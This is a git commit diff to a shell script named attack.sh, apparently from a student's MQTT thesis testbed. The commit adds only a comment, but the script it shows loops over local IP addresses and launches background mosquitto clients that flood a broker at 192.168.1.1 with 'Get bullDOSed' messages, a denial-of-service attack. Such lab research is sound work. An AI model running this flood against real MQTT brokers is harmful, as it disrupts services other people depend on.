42cb35b7584f6a9ae4b90682ad4e26bc376d2bd0
Patricia Horvath <patricia.horvath@tum.de>
2022-09-12 14:55:00 +0200

    added malicious script

--- setup/attack.sh
+++ setup/attack.sh
@@ -4,7 +4,7 @@ for i in {2..254}
 do
   IP_ADDR="192.168.1.$i"
   echo $IP_ADDR
-  /home/patty/Desktop/TUM/BA/mosquitto/client/mosquitto_sub -A "$IP_ADDR" -p 1881 -h 192.168.1.1 -t test &
+  /home/patty/Desktop/TUM/BA/mosquitto/client/mosquitto_sub -A "$IP_ADDR" -p 1881 -h 192.168.1.1 -t test & # & lets the process run in the background
   /home/patty/Desktop/TUM/BA/mosquitto/client/mosquitto_pub -A "$IP_ADDR" -p 1881 -h 192.168.1.1 -t test -m "Get bullDOSed" &
 done
 
